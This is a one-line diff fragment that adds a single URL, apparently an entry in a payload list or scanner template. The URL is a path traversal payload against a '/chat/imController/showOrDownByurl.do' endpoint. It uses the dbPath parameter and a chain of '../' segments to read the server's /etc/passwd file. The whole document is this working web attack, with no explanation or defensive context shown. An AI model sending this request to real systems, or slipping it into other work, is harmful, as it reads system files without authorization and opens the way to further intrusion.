@@ -1,0 +1,1 @@
+/chat/imController/showOrDownByurl.do?dbPath=../../../../../../etc/passwd
